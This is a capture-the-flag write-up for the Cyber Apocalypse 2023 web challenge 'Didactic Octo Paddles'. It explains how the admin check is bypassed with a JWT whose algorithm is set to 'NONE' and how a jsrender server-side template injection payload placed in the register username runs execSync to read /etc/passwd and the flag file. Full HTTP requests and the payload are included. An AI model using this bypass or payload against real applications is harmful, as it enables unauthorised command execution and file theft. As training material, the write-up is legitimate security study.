---
{"dg-publish":true,"permalink":"/personal-site/completed-writeups/ca23/didactic-octo-paddles/","tags":["#CyberApocalypse-23","web","ssti"]}
---

First, looking at `routes/index.js` I saw the register and admin directories.

```js
router.get("/admin", AdminMiddleware, async (req, res) => {
        try {
            const users = await db.Users.findAll();
            const usernames = users.map((user) => user.username);

            res.render("admin", {
                users: jsrender.templates(`${usernames}`).render(),
            });
        } catch (error) {
            console.error(error);
            res.status(500).send("Something went wrong!");
        }
    });
```

Register looked pretty standard and this admin panel is using jsrender to render all the registered users on the store, but register serves as the perfect place for jsrender template injection.

However, to do this we have to get access to the admin panel.

`/middlewares/AuthMiddleware.js` just verifies a JWT exists, but the `AdminMiddleware.js` checks details of the JWT:

```js
 if (decoded.header.alg == 'none') {
            return res.redirect("/login");
        } else if (decoded.header.alg == "HS256") {
            const user = jwt.verify(sessionCookie, tokenKey, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res.status(403).send("You are not an admin");
            }
        } else {
```

and it specifically checks first if the JWT algorithm is 'none' so I immediately thought what if I set it to 'NONE' which would short-circuit the rest of the checks, letting me in.

```json
{"alg":"NONE","typ":"JWT"}

{"id":1,"iat":1679417120,"exp":1679420720}
```

I also set the id to 1 in case of anything weird, but I doubt it will do anything.

A curl to the admin panel worked, so I set the cookie in the browser storage so I wouldn't have to change the cookie manually every time or set up a find and replace rule.

The page is rendering like I thought it would  
![Pasted image 20230323163418.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230323163418.png)

Next I looked for some jsrender SSTI payloads: [SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jsrender-nodejs)

Grabbed the server side payload:

```js
\{\{:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()\")()\}\} 
```

> **note: I had to escape the open & close brackets for this payload because it was breaking the render build for this site**

and tested it by registering a user with it:

```http
POST /register HTTP/1.1
Host: 167.71.143.44:32064
Content-Length: 341
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://167.71.143.44:32064
Referer: http://167.71.143.44:32064/register
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNjc5NDE3MTIwLCJleHAiOjE2Nzk0MjA3MjB9.MRms6TB8lfpIyZEZV2CVsKqM8NwQ1VLnVnhKuSPVHLo
Connection: close

{"username":"\{\{:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()\")()\}\}","password":"asdf"}
```

_Working as intended, surely_  
![Pasted image 20230323163430.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230323163430.png)

Taking a look at the given dockerfile, the flag is in the root directory:

```sh
# Copy flag
COPY flag.txt /flag.txt
```

So I modified the payload and registered a new user again:

```http

POST /register HTTP/1.1
Host: 167.71.143.44:32064
Content-Length: 187
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://167.71.143.44:32064
Referer: http://167.71.143.44:32064/register
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNjc5NDE3MTIwLCJleHAiOjE2Nzk0MjA3MjB9.MRms6TB8lfpIyZEZV2CVsKqM8NwQ1VLnVnhKuSPVHLo
Connection: close

{"username":"\{\{:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()\")()\}\}","password":"asdf"}
```

and a refresh of the admin panel results with the flag being rendered:  
![Pasted image 20230323163459.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230323163459.png)

or

```html

       <li class="list-group-item d-flex justify-content-between align-items-center ">
          <span>HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}
</span>
        </li>
```

`HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}`